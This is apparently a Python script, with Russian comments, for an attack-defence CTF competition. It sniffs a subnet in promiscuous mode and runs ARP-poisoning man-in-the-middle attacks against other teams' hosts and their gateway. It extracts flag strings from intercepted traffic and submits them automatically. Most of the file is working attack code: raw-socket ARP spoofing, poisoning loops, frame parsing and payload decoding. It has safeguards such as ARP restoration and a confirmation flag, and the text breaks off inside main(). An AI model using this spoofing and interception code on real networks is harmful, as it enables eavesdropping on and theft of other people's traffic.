#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SNIFFER — перехват ЧУЖИХ флагов в эфире нашей подсети + автосдача.
(сценарии 2 и 3 из разбора Савелия: «между командами и жюри» и
«между чекером и чужим сервисом»)

ЧЕМ ОТЛИЧАЕТСЯ ОТ shim.py
  shim.py стоит на НАШЕЙ коробке и видит флаг в момент, когда чекер
  записывает его НАМ. Это сценарий 1, он уже есть.
  sniffer.py слушает ЭФИР НАШЕЙ подсети 10.2.x.0/24 и ловит флаги СОСЕДЕЙ:
    - пассивно: в плоском L2 видим ЧУЖОЙ эксплойт-трафик (запросы и ответы
      сервисов со свежими флагами) -> сдаём ПЕРВЫМИ. Факт из исходников
      ForcAD: первый сдавший забирает всё (FLAG_ALREADY_STOLEN) — дубль
      второй команды не стоит НИЧЕГО, поэтому весь смысл снифера — успеть
      РАНЬШЕ фермы соседа, а не сдать дубль;
    - в режиме MITM: чекер пишет флаг в сервис СОСЕДА -> пакет проходит
      через нас -> флаг у нас РАНЬШЕ, чем сосед его вообще увидит
      (и раньше его фермы успеет сдать — скорость решает).

ДВА РЕЖИМА
  --passive   просто слушать эфир в promisc. Ноль риска: мы никого не
              обманываем и ничего не ломаем (read-only). В коммутируемой
              сети увидим свой трафик и broadcast; в плоской (хаб, бридж,
              общий L2) — всех. TLS-потоки (анонс: трафик шифруется)
              непрозрачны — рассчитываем только на plaintext-HTTP
              сервисов и соседского софта.
  --mitm      ARP-травля: соседу говорим «шлюз — это я», шлюзу — «сосед —
              это я». Их трафик начинает ходить ЧЕРЕЗ НАС. Мы его только
              ЧИТАЕМ и пересылаем дальше: ничего не дропаем и не подменяем.

БЕЗОПАСНОСТЬ (рельсы, снятые сознательно — не отключать!)
  1. ip_forward включается ДО первой травли. Без него соседи мгновенно
     уходят в чёрную дыру и теряют игру — это скандал и дисквал.
  2. На выход (Ctrl-C, SIGTERM, --once) — АВТОМАТИЧЕСКИЙ ремонт ARP:
     каждому отравленному хосту возвращаем настоящий MAC шлюза (6 повторов),
     ip_forward возвращаем к исходному значению, promisc снимаем.
  3. ARP-травить можно ТОЛЬКО внутри нашего /24. Жюри (10.10.0.0/16),
     наш IP и шлюз — вне закона для травли (жёстко проверяется кодом).
  4. Режим MITM требует явных флагов --mitm --arp-ok: чтобы не запустить
     травлю случайно одной кнопкой.
  5. Что НЕЛЬЗЯ делать поверх снифера (и чего мы сознательно не сделали):
     дропать чужие сабмиты, подменять флаги в транзите, грузить CPU чужих
     боксов — это ломает игру другим и по правилам = дисквалификация.
     Снифер читает, но не портит.

ЧТО ДЕЛАЕТ С ПОЙМАННЫМ
  - regex флага [A-Z0-9]{31}= (сырой вид, URL-decode, base64-блоки);
  - дедуп (не сдаём одно и то же), свой трафик игнорирует;
  - НАШИ канарейки (canaries.txt) и ручной denylist.txt — не сдаём;
  - авто-детект ЛЖЕФЛАГОВ: если одинаковая строка прилетела с 4+ разных
    IP — это чужая пустышка, расставленная по всей подсети (настоящие
    флаги уникальны для команды) -> авто-deny навсегда;
  - батчами по таймеру сдаёт в жюри тем же протоколом, что farm.py
    (TCP 31337: токен первой строкой; фолбэк — HTTP PUT /flags);
  - всё пишет в sniffed.jsonl — после игры видно, КТО и ЧТО сдавал.

ЗАПУСК (нужен root: raw-sockets)
  sudo python3 sniffer.py --init                      # создать/дописать farm.json
  sudo python3 sniffer.py --discover                  # кто жив в 10.2.x.0/24
  sudo python3 sniffer.py --selftest                  # проверка без сети
  sudo python3 sniffer.py --passive --dry-run         # слушать, НЕ сдавать
  sudo python3 sniffer.py --passive                   # слушать + сдавать
  sudo python3 sniffer.py --mitm --targets 10.2.7.3,10.2.7.5 --arp-ok
  sudo python3 sniffer.py --mitm --all --arp-ok --yes # вся подсеть
  --once 600  — выйти через 10 минут самому (для nohup)

ФАЙЛЫ
  farm.json         — общий конфиг с фермой (token команды, номер команды)
  sniff_state.json  — дедуп + авто-deny (переживает рестарт)
  sniffed.jsonl     — журнал всех находок (атрибуция после игры)

Только стандартная библиотека + farm.py. Python 3.8+.
"""
import argparse
import base64
import fcntl
import json
import os
import re
import signal
import socket
import struct
import sys
import threading
import time
import urllib.parse
from datetime import datetime

import farm  # общий конфиг, сдача флагов, deny-листы (только stdlib внутри)

SELF_DIR = os.path.dirname(os.path.abspath(__file__))

# Главная регулярка флага InnoCTF: 31 символ [A-Z0-9] и '=' в конце.
FLAG_RE = re.compile(rb"[A-Z0-9]{31}=")

# Псевдослучайные константы ядра для ioctl (флаги интерфейса)
SIOCGIFFLAGS = 0x8913
SIOCSIFFLAGS = 0x8915
IFF_PROMISC = 0x100

# Сеть жюри: ARP туда никогда не травим (только читаем, если придёт)
JURY_NET = "10.10.0.0/16"

SNIFF_DEFAULTS = {
    "iface": "",              # пусто = интерфейс маршрута по умолчанию
    "sniff_state_file": "sniff_state.json",
    "sniff_log_file": "sniffed.jsonl",
    "sniff_once_sec": 0,      # 0 = работать до Ctrl-C
    "submit_batch_sec": 2.0,  # раз в N секунд сдавать накопленный батч
    "submit_batch_size": 25,  # максимум флагов в одном пакете сдачи
    "decoy_min_src": 4,       # одинаковый флаг с >=N разных IP = лжефлаг
    "arp_poison_period": 3.0, # период повторной травли (кэш ARP живёт недолго)
    "own_ips": [],            # авто: наш IP + наша коробка; сюда добавь свои
}


# ======================================================================
#  ЛОГ
# ======================================================================
def log(msg):
    """Консольный лог с таймстемпом — единый стиль с farm.py."""
    print("[%s] %s" % (datetime.now().strftime("%H:%M:%S"), msg), flush=True)


def jlog(path, obj):
    """Журнал находок в jsonl — по строке на событие, удобно grep-ать."""
    try:
        with open(path, "a", encoding="utf-8") as f:
            f.write(json.dumps(obj, ensure_ascii=False) + "\n")
    except OSError:
        pass


# ======================================================================
#  СЕТЕВЫЕ УТИЛИТЫ (без scapy — голые сокеты, работает на любом Kali)
# ======================================================================
def default_iface():
    """Интерфейс маршрута по умолчанию (читаем /proc/net/route)."""
    try:
        with open("/proc/net/route") as f:
            for line in f.readlines()[1:]:
                cols = line.split()
                if len(cols) > 1 and cols[1] == "00000000":
                    return cols[0]
    except OSError:
        pass
    return "eth0"


def my_ip():
    """Наш IP в подсети (UDP-connect не шлёт пакетов — это безопасно)."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("10.10.10.10", 9))
        return s.getsockname()[0]
    except OSError:
        return "127.0.0.1"
    finally:
        s.close()


def my_mac(iface):
    """Наш MAC: читается из sysfs, root не нужен."""
    try:
        with open("/sys/class/net/%s/address" % iface) as f:
            return f.read().strip()
    except OSError:
        return "00:00:00:00:00:00"


def mac_bytes(mac_str):
    """'aa:bb:cc:dd:ee:ff' -> b'\xaa\xbb\xcc\xdd\xee\xff'."""
    return bytes(int(p, 16) for p in mac_str.split(":"))


def bytes_mac(b):
    """Обратно: 6 байт -> читаемая строка MAC."""
    return ":".join("%02x" % c for c in b)


def ip_bytes(ip):
    return socket.inet_aton(ip)


def set_promisc(fd, iface, on):
    """Включить/выключить promisc. Возвращает ПРЕЖНИЙ набор флагов,
    чтобы на выходе вернуть интерфейс ровно в исходное состояние."""
    ifreq = struct.pack("16sH22s", iface.encode()[:15], 0, b"")
    cur = struct.unpack("16sH22s", fcntl.ioctl(fd, SIOCGIFFLAGS, ifreq))[1]
    new = (cur | IFF_PROMISC) if on else (cur & ~IFF_PROMISC)
    if new != cur:
        fcntl.ioctl(fd, SIOCSIFFLAGS,
                    struct.pack("16sH22s", iface.encode()[:15], new, b""))
    return cur


def ip_forward_get():
    try:
        with open("/proc/sys/net/ipv4/ip_forward") as f:
            return f.read().strip()
    except OSError:
        return "?"


def ip_forward_set(val):
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write(str(val))
        return True
    except OSError:
        return False


def in_net(ip, net):
    """IP входит в CIDR-сеть? (без ipaddress — просто по префиксу)"""
    try:
        net_ip, plen = net.split("/")
        a = struct.unpack("!I", ip_bytes(ip))[0]
        b = struct.unpack("!I", ip_bytes(net_ip))[0]
        mask = (0xFFFFFFFF << (32 - int(plen))) & 0xFFFFFFFF
        return (a & mask) == (b & mask)
    except (ValueError, OSError):
        return False


# ======================================================================
#  ARP: сборка/разбор/отправка
# ======================================================================
def arp_frame(my_mac_b, oper, sha, spa, tha, tpa):
    """Собрать Ethernet+ARP кадр. oper: 1=request, 2=reply.
    sha/spa — кто отвечает (MAC/IP), tha/tpa — кому адресован."""
    eth = tha + my_mac_b + struct.pack("!H", 0x0806)
    arp = struct.pack("!HHBBH", 1, 0x0800, 6, 4, oper) + sha + spa + tha + tpa
    return eth + arp + b"\x00" * 18  # паддинг до минимальных 60 байт


def parse_arp(payload):
    """Разбор ARP-секции кадра: -> dict или None."""
    if len(payload) < 28:
        return None
    oper = struct.unpack("!H", payload[6:8])[0]
    sha = bytes_mac(payload[8:14])
    spa = socket.inet_ntoa(payload[14:18])
    tpa = socket.inet_ntoa(payload[24:28])
    return {"oper": oper, "sha": sha, "spa": spa, "tpa": tpa}


# ======================================================================
#  РАЗБОР КАДРОВ: Ethernet -> IPv4 -> TCP/UDP
# ======================================================================
def parse_frame(frame):
    """Кадр -> dict с payload. Понимаем VLAN (один тег), IPv4, TCP, UDP.
    IPv6/фрагменты/прочее пропускаем: флаги туда не ходят."""
    if len(frame) < 14:
        return None
    ethertype = struct.unpack("!H", frame[12:14])[0]
    off = 14
    if ethertype == 0x8100:            # VLAN-тег: перепрыгиваем 4 байта
        if len(frame) < 18:
            return None
        ethertype = struct.unpack("!H", frame[16:18])[0]
        off = 18
    if ethertype == 0x0806:
        return {"type": "arp", "arp": parse_arp(frame[off:])}
    if ethertype != 0x0800:
        return None
    ip = frame[off:]
    if len(ip) < 20 or ip[0] >> 4 != 4:
        return None
    ihl = (ip[0] & 0x0F) * 4
    if ihl < 20 or len(ip) < ihl:
        return None
    frag = struct.unpack("!H", ip[6:8])[0]
    if frag & 0x1FFF:                  # не первый фрагмент — флага не увидим
        return None
    proto = ip[9]
    src = socket.inet_ntoa(ip[12:16])
    dst = socket.inet_ntoa(ip[16:20])
    total = struct.unpack("!H", ip[2:4])[0]
    end = max(ihl, min(total, len(ip)))
    l4 = ip[ihl:end]
    if proto == 6 and len(l4) >= 20:            # TCP
        sport, dport = struct.unpack("!HH", l4[0:4])
        doff = (l4[12] >> 4) * 4
        return {"type": "tcp", "src": src, "dst": dst,
                "sport": sport, "dport": dport, "payload": l4[doff:]}
    if proto == 17 and len(l4) >= 8:            # UDP
        sport, dport = struct.unpack("!HH", l4[0:4])
        return {"type": "udp", "src": src, "dst": dst,
                "sport": sport, "dport": dport, "payload": l4[8:]}
    return None


# ======================================================================
#  ИЗВЛЕЧЕНИЕ ФЛАГОВ: сырые / URL-код / base64
# ======================================================================
B64_RUN = re.compile(rb"[A-Za-z0-9+/]{40,4000}=*")


def extract_flags(payload):
    """Все флаги-кандидаты из байтов payload. Три попытки:
    1) сырой вид; 2) URL-decode (чекеры часто кодируют '='); 3) base64-блоки
    (ответы сервисов часто отдают данные в b64). Дубли убираем.

    ШУМ: сырой скан может дать ложный «флаг» на хвосте base64-блоба
    (31 символ верхнего регистра перед '='). Это редкость и не вредно:
    жюри такой мусор отклонит, а одинаковый мусор с 4+ IP авто-deny."""
    found = []
    seen = set()

    def add(data):
        for m in FLAG_RE.findall(data):
            fl = m.decode("ascii")
            if fl not in seen:
                seen.add(fl)
                found.append(fl)

    if not payload:
        return found
    add(payload)                                     # 1) сырой вид
    if b"%" in payload:                              # 2) URL-encoding
        try:
            add(urllib.parse.unquote_to_bytes(
                payload[:8192].replace(b"+", b" ")))
        except Exception:
            pass
    for run in B64_RUN.findall(payload)[:12]:        # 3) base64-блоки
        try:
            # нормализуем паддинг: срезаем старый, добиваем до кратности 4
            s = run.rstrip(b"=")
            s += b"=" * (-len(s) % 4)
            dec = base64.b64decode(s, validate=True)
            add(dec)
        except Exception:
            pass
    return found


def ctx_preview(payload, flag, width=60):
    """Контекст вокруг флага — чтобы глазами понять, откуда он прилетел."""
    i = payload.find(flag.encode("ascii"))
    if i < 0:
        return ""
    s = payload[max(0, i - width): i + len(flag) + width]
    return "".join(chr(c) if 32 <= c < 127 else "." for c in s)


# ======================================================================
#  СОСТОЯНИЕ: дедуп, авто-deny, отложенная сдача
# ======================================================================
class SniffState(object):
    """Всё состояние снифера. Пишется на диск, переживает рестарт:
    после падения мы не начнём сдавать один и тот же флаг по кругу."""

    def __init__(self, path):
        self.path = path
        self.submitted = {}   # flag -> ts  (уже сдали, не трогаем)
        self.denied = {}      # flag -> ts  (канарейки/лжефлаги)
        self.seen_src = {}    # flag -> {src_ip: ts}  для авто-детекта decoy
        self.pending = {}     # flag -> {"tries": N, "pkt": {...}}
        self.load()

    def load(self):
        if not os.path.exists(self.path):
            return
        try:
            with open(self.path, "r", encoding="utf-8") as f:
                d = json.load(f)
            self.submitted = d.get("submitted", {})
            self.denied = d.get("denied", {})
        except (OSError, ValueError):
            log("state-файл битый, начинаем с чистого")

    def save(self):
        tmp = self.path + ".tmp"
        try:
            with open(tmp, "w", encoding="utf-8") as f:
                json.dump({"submitted": self.submitted,
                           "denied": self.denied}, f)
            os.replace(tmp, self.path)
        except OSError as e:
            log("не сохранил state: %s" % e)

    def cap(self):
        """Не даём словарям расти бесконечно за 5 часов игры."""
        for d in (self.submitted, self.denied, self.seen_src):
            if len(d) > 8000:
                for k in list(d)[: len(d) - 8000]:
                    del d[k]


def handle_candidate(fl, pkt, state, cfg, canaries, dry):
    """Решение по флагу-кандидату: сдать / отбросить / пометить decoy.
    Возвращает действие для журнала."""
    now = time.time()
    own = set(cfg.get("own_ips") or [])
    if pkt["src"] in own or pkt["dst"] in own:
        return "skip-own"          # свой флаг/свой сабмит — очков не даёт
    if fl in state.submitted:
        return "dedup"
    if fl in state.denied or fl in canaries:
        return "denied"
    # авто-детект лжефлага: та же строка с многих IP = пустышка соседей
    srcs = state.seen_src.setdefault(fl, {})
    srcs[pkt["src"]] = now
    if len(srcs) >= int(cfg["decoy_min_src"]):
        state.denied[fl] = now
        state.save()
        log("DECOY auto-deny %s (виден с %d IP)" % (fl, len(srcs)))
        return "deny-decoy"
    if dry:
        return "dry-run"
    state.pending[fl] = {"tries": 0, "pkt": pkt}
    return "queued"


# ======================================================================
#  ПОТОК СДАЧИ: батчами, с ретраями и упорным дедупом
# ======================================================================
def submitter_loop(state, cfg, canaries, stop, dry):
    """Отдельный поток: раз в submit_batch_sec забирает накопленное и сдаёт.
    Ретраи только на СЕТЕВЫЕ ошибки; ответ жюри «DUP/OLD» — флаг закрыт."""
    batch_sec = float(cfg["submit_batch_sec"])
    batch_max = int(cfg["submit_batch_size"])
    while not stop.is_set() or state.pending:
        stop.wait(batch_sec)
        if dry or not state.pending:
            continue
        batch = list(state.pending.items())[:batch_max]
        flags = [fl for fl, _ in batch]
        try:
            acc, rej = farm.submit_flags(cfg, flags)
            for fl, _ in batch:
                state.submitted[fl] = time.time()
                state.pending.pop(fl, None)
            log("сдано батч %d: принято %s, отказ %s" % (len(flags), acc, rej))
        except Exception as e:  # noqa: BLE001  сеть моргнула — попробуем ещё
            for fl, meta in batch:
                meta["tries"] += 1
                if meta["tries"] >= 3:
                    state.pending.pop(fl, None)
                    log("сдача не удалась 3 раза, откладываю %s" % fl)
        state.cap()
        state.save()


# ======================================================================
#  ГЛАВНЫЙ ЦИКЛ СНИФЕРА
# ======================================================================
def sniff_loop(sock, state, cfg, canaries, stop, dry, my_mac_str):
    """Читаем кадры, разбираем, ищем флаги. До stop_event."""
    logf = os.path.join(SELF_DIR, cfg["sniff_log_file"])
    while not stop.is_set():
        try:
            frame = sock.recv(65535)
        except socket.timeout:
            continue
        except OSError:
            break
        pkt = parse_frame(frame)
        if not pkt or pkt["type"] == "arp" or not pkt.get("payload"):
            continue
        if bytes_mac(frame[6:12]) == my_mac_str:   # src == наш MAC: свои копии
            continue                                # (пересланные наружу) не считаем
        flags = extract_flags(pkt["payload"])
        if not flags:
            continue
        for fl in flags:
            act = handle_candidate(fl, pkt, state, cfg, canaries, dry)
            jlog(logf, {"ts": datetime.now().isoformat(timespec="seconds"),
                        "flag": fl, "act": act,
                        "src": pkt["src"], "dst": pkt["dst"],
                        "sport": pkt.get("sport"), "dport": pkt.get("dport"),
                        "proto": pkt["type"],
                        "ctx": ctx_preview(pkt["payload"], fl)})
            if act == "queued":
                log("ФЛАГ %s  %s:%s -> %s:%s" % (fl, pkt["src"],
                    pkt.get("sport"), pkt["dst"], pkt.get("dport")))


# ======================================================================
#  РЕЖИМ MITM: травля + безусловный ремонт на выходе
# ======================================================================
class MitmManager(object):
    """Держит ARP-травлю и ГАРАНТИРУЕТ ремонт при любом выходе.
    Правило номер один: сосед должен играть дальше после нашего Ctrl-C."""

    def __init__(self, sock, iface, my_mac_str, my_ip_str, gw_ip, period):
        self.sock = sock
        self.iface = iface
        self.my_mac_b = mac_bytes(my_mac_str)
        self.my_ip_b = ip_bytes(my_ip_str)
        self.gw_ip = gw_ip
        self.targets = []            # [{"ip":..., "mac":...}]
        self._pending_targets = []   # кого спрашивать при resolve
        self._gw_mac_b = None
        self._period = period
        self.ipf_was = ip_forward_get()
        self.stop = threading.Event()

    # --- окружение ---------------------------------------------------
    def resolve_macs(self):
        """Одна ARP-прослушка: спрашиваем шлюз и цели, собираем MAC.
        _pending_targets должен быть заполнен ДО вызова."""
        reqs = [self.gw_ip] + [t for t in self._pending_targets
                               if t != self.gw_ip]
        found = {}
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                             socket.ntohs(0x0003))
        sock.bind((self.iface, 0))
        sock.settimeout(0.2)
        bcast = b"\xff" * 6
        for ip in reqs:
            f = arp_frame(self.my_mac_b, 1, self.my_mac_b, self.my_ip_b,
                          bcast, ip_bytes(ip))
            try:
                sock.send(f)
            except OSError:
                pass
            time.sleep(0.02)
        deadline = time.time() + 2.0
        while time.time() < deadline and len(found) < len(reqs):
            try:
                frame = sock.recv(65535)
            except socket.timeout:
                continue
            pkt = parse_frame(frame)
            if pkt and pkt["type"] == "arp" and pkt["arp"]["oper"] == 2:
                a = pkt["arp"]
                if a["spa"] in reqs and a["spa"] not in found:
                    found[a["spa"]] = a["sha"]
        sock.close()
        return found

    # --- травля ------------------------------------------------------
    def _poison_frame_to_victim(self, victim):
        """Соседу: «шлюз (gw_ip) находится по MAC нашей карты»."""
        return arp_frame(self.my_mac_b, 2, self.my_mac_b,
                         ip_bytes(self.gw_ip),
                         mac_bytes(victim["mac"]), ip_bytes(victim["ip"]))

    def _poison_frame_to_gw(self, victim):
        """Шлюзу: «сосед (victim_ip) находится по MAC нашей карты»."""
        return arp_frame(self.my_mac_b, 2, self.my_mac_b,
                         ip_bytes(victim["ip"]),
                         self._gw_mac_b, ip_bytes(self.gw_ip))

    def poison_once(self):
        for v in self.targets:
            try:
                self.sock.send(self._poison_frame_to_victim(v))
                self.sock.send(self._poison_frame_to_gw(v))
            except OSError:
                pass

    def restore(self):
        """РЕМОНТ: каждому возвращаем настоящую пару MAC/IP. 6 повторов
        с паузой — перекрывает любые кэши. Также откатываем ip_forward."""
        log("ремонт ARP: возвращаю всем настоящие MAC...")
        if not self.targets:
            return
        if not self._gw_mac_b:
            log("!! MAC шлюза неизвестен — чини ARP руками: arp -d у соседей")
        for _ in range(6):
            for v in self.targets:
                vmac = mac_bytes(v["mac"])
                try:
                    if self._gw_mac_b:
                        self.sock.send(arp_frame(
                            self.my_mac_b, 2, self._gw_mac_b,
                            ip_bytes(self.gw_ip), vmac, ip_bytes(v["ip"])))
                    self.sock.send(arp_frame(
                        self.my_mac_b, 2, vmac, ip_bytes(v["ip"]),
                        self._gw_mac_b, ip_bytes(self.gw_ip)))
                except OSError:
                    pass
            time.sleep(0.15)
        if self.ipf_was not in ("1", "?"):
            ip_forward_set(self.ipf_was)
            log("ip_forward возвращён в %s" % self.ipf_was)
        log("ремонт завершён")

    def loop(self):
        """Фон: раз в arp_poison_period повторяем травлю (кэш ARP утекает)."""
        while not self.stop.wait(self._period):
            self.poison_once()

    # --- запуск ------------------------------------------------------
    def start(self, victim_list, victim_macs, gw_mac):
        self._gw_mac_b = mac_bytes(gw_mac) if gw_mac else None
        self.targets = [{"ip": ip, "mac": victim_macs.get(ip, "")}
                        for ip in victim_list]
        self.targets = [t for t in self.targets if t["mac"]]
        if not self.targets:
            raise RuntimeError("ни у одной цели не найден MAC — травить некого")
        if self.ipf_was != "1":
            if not ip_forward_set(1):
                raise RuntimeError("не смог включить ip_forward (нужен root)")
            log("ip_forward: %s -> 1 (верну %s на выходе)" %
                (self.ipf_was, self.ipf_was))
        self.poison_once()
        t = threading.Thread(target=self.loop, daemon=True)
        t.start()
        return t


# ======================================================================
#  DISCOVER: кто жив в нашем /24
# ======================================================================
def discover(cfg, iface):
    """ARP-опрос всей подсети: таблица IP/MAC. Проверка «плоская ли сеть»:
    если живых < 2 — что-то не так (VLAN или мы одни). Шлём 254 запроса с
    темпом 20 мс, затем 2.5 сек собираем ответы."""
    my_ip_str = my_ip()
    base = subnet_base(cfg)
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                         socket.ntohs(0x0003))
    sock.bind((iface, 0))
    sock.settimeout(0.2)
    my_mac_b = mac_bytes(my_mac(iface))
    bcast = b"\xff" * 6
    found = {}
    sent = 0
    log("discover %s0/24 с %s (%s)..." % (base, iface, my_ip_str))

    def drain(seconds):
        """Собрать ответы в течение N секунд (ARP reply)."""
        end = time.time() + seconds
        while time.time() < end:
            try:
                frame = sock.recv(65535)
            except socket.timeout:
                continue
            pkt = parse_frame(frame)
            if pkt and pkt["type"] == "arp" and pkt["arp"]["oper"] == 2:
                a = pkt["arp"]
                if a["spa"].startswith(base):
                    found[a["spa"]] = a["sha"]

    for i in range(1, 255):
        if stop_event.is_set():
            break
        ip = "%s%d" % (base, i)
        if ip == my_ip_str:
            continue
        try:
            sock.send(arp_frame(my_mac_b, 1, my_mac_b, ip_bytes(my_ip_str),
                                bcast, ip_bytes(ip)))
        except OSError as e:
            log("send fail: %s" % e)
            break
        sent += 1
        drain(0.02)  # короткий дренаж между запросами — ответы приходят сразу
    drain(2.5)       # дозбор: у медленных соседей ответ мог запоздать
    sock.close()
    log("живых хостов: %d (запросов %d)" % (len(found), sent))
    for ip in sorted(found, key=lambda x: struct.unpack("!I", ip_bytes(x))[0]):
        mark = ""
        if ip.endswith(".1"):
            mark = "  <- шлюз (вероятно)"
        if ip.endswith(".2"):
            mark = "  <- наша коробка? (по схеме 10.2.x.2)"
        print("  %-15s %s%s" % (ip, found[ip], mark))
    if len(found) < 2:
        log("ВНИМАНИЕ: почти никого не видно. Сеть может быть не плоской "
            "(VLAN/бридж на команду) — тогда пассивный режим увидит мало, "
            "а MITM бессмыслен. Проверь iface (--iface) и кабель.")
    return found


def subnet_base(cfg):
    """10.2.{t}.2 + my_team=7 -> '10.2.7.' (без последнего октета)."""
    vuln = cfg["subnet_template"].format(t=cfg.get("my_team", 1))
    return ".".join(vuln.split(".")[:3]) + "."


# ======================================================================
#  SELFTEST: всё проверяется без сети и без root
# ======================================================================
def selftest():
    ok = [0]

    def check(name, cond):
        ok[0] += 1
        assert cond, "FAIL: %s" % name
        print("  ok  %s" % name)

    FLAG = "A" * 31 + "="

    # 1) регулярка флага
    check("regex: точный флаг", extract_flags(b"xx " + FLAG.encode()) == [FLAG])
    check("regex: в HTML", extract_flags(b"<p>flag is " + FLAG.encode() +
                                         b"!</p>") == [FLAG])
    check("regex: lowercase мимо",
          extract_flags(b"a" * 31 + b"=") == [])
    check("regex: 30 символов мимо",
          extract_flags(b"A" * 30 + b"=") == [])

    # 2) URL-кодирование ('=' -> %3D)
    url = urllib.parse.quote(FLAG).encode()
    check("urldecode: %3D", extract_flags(b"GET /x?d=" + url) == [FLAG])

    # 3) base64-обёртка (как в ответах сервисов); флаг со СМЕШАННЫМ
    #    алфавитом — реалистичный случай: b64 такого флага сам не должен
    #    совпасть с raw-регуляркой (нет прогона из 31 [A-Z0-9] перед '=')
    FLAG2 = "K7M2XQ9P4W8R3T6Y1U5E2N4B7V9C3Z1="
    b64 = base64.b64encode(FLAG2.encode())
    check("base64: в ответе (без шума)", extract_flags(b"data=" + b64) == [FLAG2])

    # 4) разбор кадра IPv4/TCP с флагом внутри
    payload = b"GET /f?id=1 HTTP/1.1\r\nHost: x\r\n\r\n" + FLAG.encode()
    tcp = struct.pack("!HHIIBBH", 44444, 31337, 1, 1, (5 << 4), 0x18, 65535)
    iph = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + len(tcp) + len(payload),
                      1, 0, 64, 6, 0, ip_bytes("10.2.7.3"), ip_bytes("10.10.10.10"))
    frame = b"\x00" * 6 + b"\x11" * 6 + struct.pack("!H", 0x0800) + iph + tcp + payload
    pkt = parse_frame(frame)
    check("parse: tcp", pkt and pkt["type"] == "tcp" and pkt["dport"] == 31337)
    check("parse: флаг в payload", extract_flags(pkt["payload"]) == [FLAG])

    # 5) UDP тоже разбирается
    udp = struct.pack("!HHHH", 53, 9999, 8 + len(payload), 0) + payload
    ipu = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + len(udp), 1, 0, 64, 17, 0,
                      ip_bytes("10.2.7.4"), ip_bytes("10.2.7.5"))
    fr2 = b"\x00" * 6 + b"\x22" * 6 + struct.pack("!H", 0x0800) + ipu + udp
    p2 = parse_frame(fr2)
    check("parse: udp", p2 and p2["type"] == "udp")
    check("parse: флаг из udp", extract_flags(p2["payload"]) == [FLAG])

    # 6) ARP сборка/разбор
    fr3 = arp_frame(b"\x01" * 6, 2, b"\x02" * 6, ip_bytes("10.2.7.1"),
                    b"\x03" * 6, ip_bytes("10.2.7.9"))
    a = parse_frame(fr3)
    check("arp: roundtrip", a and a["type"] == "arp" and
          a["arp"]["oper"] == 2 and a["arp"]["spa"] == "10.2.7.1" and
          a["arp"]["sha"] == "02:02:02:02:02:02")

    # 7) VLAN-тег не теряем
    fr4 = b"\x00" * 6 + b"\x33" * 6 + struct.pack("!H", 0x8100) + \
        struct.pack("!HH", 100, 0x0800) + iph + tcp + payload
    p4 = parse_frame(fr4)
    check("parse: vlan", p4 and extract_flags(p4["payload"]) == [FLAG])

    # 8) авто-детект decoy: одинаковый флаг с 4 разных IP -> deny
    st_path = os.path.join(SELF_DIR, "sniff_state_selftest.json")
    if os.path.exists(st_path):
        os.remove(st_path)
    st = SniffState(st_path)
    cfgs = dict(SNIFF_DEFAULTS)
    for i in range(4):
        act = handle_candidate(FLAG, {"src": "10.2.%d.3" % (10 + i),
                                      "dst": "10.10.10.10"},
                               st, cfgs, set(), True)
    check("decoy: авто-deny с 4 IP", act == "deny-decoy" and FLAG in st.denied)

    # 9) свой IP — пропуск
    cfg2 = dict(SNIFF_DEFAULTS, own_ips=["10.2.7.99"])
    act = handle_candidate("B" * 31 + "=",
                           {"src": "10.2.7.99", "dst": "10.10.10.10"},
                           st, cfg2, set(), True)
    check("own: пропуск", act == "skip-own")

    # 10) канарейка — deny
    act = handle_candidate("C" * 31 + "=",
                           {"src": "10.2.7.3", "dst": "10.10.10.10"},
                           st, cfg2, {"C" * 31 + "="}, True)
    check("canary: deny", act == "denied")

    # 11) state roundtrip
    st.save()
    st2 = SniffState(st_path)
    check("state: roundtrip", FLAG in st2.denied)
    os.remove(st_path)

    # 12) in_net: жюри не путаем с подсетью
    check("net: 10.10.10.10 в 10.10.0.0/16", in_net("10.10.10.10", JURY_NET))
    check("net: 10.2.7.3 НЕ в жюри", not in_net("10.2.7.3", JURY_NET))

    print("САМОТЕСТ СНИФЕРА ПРОЙДЕН (%d проверок)" % ok[0])


# ======================================================================
#  CONFIG
# ======================================================================
def load_cfg(path):
    """Конфиг = farm.DEFAULTS + наши sniff-ключи + переопределения из
    farm.json (общий файл с фермой: один team_token на оба инструмента)."""
    cfg = dict(farm.DEFAULTS)
    cfg.update(SNIFF_DEFAULTS)
    p = os.path.join(SELF_DIR, path)
    if os.path.exists(p):
        with open(p, "r", encoding="utf-8") as f:
            cfg.update(json.load(f))
    return cfg


def init_config(path):
    p = os.path.join(SELF_DIR, path)
    cfg = dict(farm.DEFAULTS)
    cfg.update(SNIFF_DEFAULTS)
    if os.path.exists(p):
        with open(p, "r", encoding="utf-8") as f:
            cfg.update(json.load(f))
    with open(p, "w", encoding="utf-8") as f:
        json.dump(cfg, f, ensure_ascii=False, indent=2)
    print("Конфиг %s готов. Проверь перед игрой:" % path)
    print("  my_team      — номер НАШЕЙ команды")
    print("  team_token   — токен сдачи жюри (тот же, что у фермы)")
    print("  iface        — можно пусто (авто) или eth0/wlan0")
    print("  own_ips      — авто (наш IP + 10.2.x.2); добавь вторую машину, если есть")


# ======================================================================
#  MAIN
# ======================================================================
stop_event = threading.Event()


def _sig(_a, _b):
    stop_event.set()


def main():
    ap = argparse.ArgumentParser(description="Снифер чужих флагов (A/D CTF)")
    ap.add_argument("--config", default="farm.json")
    ap.add_argument("--init", action="store_true", help="создать/обновить конфиг")
    ap.add_argument("--selftest", action="store_true")
    ap.add_argument("--discover", action="store_true", help="кто жив в /24")
    ap.add_argument("--passive", action="store_true", help="слушать эфир")
    ap.add_argument("--mitm", action="store_true", help="ARP-травля + слушаем")
    ap.add_argument("--targets", default="", help="IP целей через запятую")
    ap.add_argument("--all", action="store_true", help="травить весь /24")
    ap.add_argument("--arp-ok", action="store_true",
                    help="подтверждаю: правилами игры ARP-травля разрешена")
    ap.add_argument("--yes", action="store_true", help="без вопросов")
    ap.add_argument("--iface", default="", help="интерфейс (eth0/wlan0)")
    ap.add_argument("--once", type=int, default=0, help="выйти через N секунд")
    ap.add_argument("--dry-run", action="store_true", help="НЕ сдавать флаги")
    args = ap.parse_args()

